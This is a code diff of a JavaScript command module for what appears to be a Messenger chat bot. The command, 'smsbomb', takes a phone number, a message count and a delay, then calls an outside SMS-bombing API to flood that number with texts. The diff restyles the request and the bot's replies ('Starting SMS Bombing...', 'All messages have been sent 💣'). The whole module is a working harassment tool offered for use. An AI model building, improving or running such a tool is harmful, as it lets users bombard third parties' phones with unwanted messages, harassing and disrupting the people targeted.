@@ -2,29 +2,35 @@ const axios = require('axios');
 
 module.exports = {
   name: 'smsbomb',
-  description: 'Send multiple SMS messages to a number with a delay',
-  author: 'dev',
+  description: 'initiates sms bombing by sending multiple sms messages.',
+  author: 'developer',
+  
   async execute(senderId, args, pageAccessToken, sendMessage) {
-    const [number, amount, delay] = args;
+    const [phone, amount, cooldown] = args;
 
-    if (!number || !amount || !delay) {
-      sendMessage(senderId, { text: 'Usage: smsbomb [number] [amount] [delay]' }, pageAccessToken);
+    if (!phone || !amount || !cooldown) {
+      sendMessage(senderId, { text: 'Usage: smsbomb [phone] [amount] [cooldown]' }, pageAccessToken);
       return;
     }
 
+    sendMessage(senderId, { text: '⚙️ Starting SMS Bombing...' }, pageAccessToken);
+
     try {
-      const apiUrl = `https://deku-rest-apis.ooguy.com/smsb?number=${number}&amount=${amount}&delay=${delay}`;
-      const response = await axios.get(apiUrl);
-      
-      const { status, success, fail } = response.data;
-      if (status) {
-        sendMessage(senderId, { text: `Successfully sent ${success} SMS messages to ${number}. ${fail} messages failed.` }, pageAccessToken);
-      } else {
-        sendMessage(senderId, { text: 'Failed to send SMS messages.' }, pageAccessToken);
-      }
+      const response = await axios.get('https://deku-rest-apis.ooguy.com/smsb', {
+        params: {
+          number: phone,
+          amount: amount,
+          delay: cooldown
+        }
+      });
+
+      const data = response.data;
+      console.log('Response:', data);
+
+      sendMessage(senderId, { text: 'Success! All messages have been sent 💣' }, pageAccessToken);
     } catch (error) {
-      console.error('Error sending SMS messages:', error);
-      sendMessage(senderId, { text: 'Sorry, there was an error processing your request.' }, pageAccessToken);
+      console.error('Error:', error);
+      sendMessage(senderId, { text: '🔥 An error occurred while sending messages.' }, pageAccessToken);
     }
   }
 };
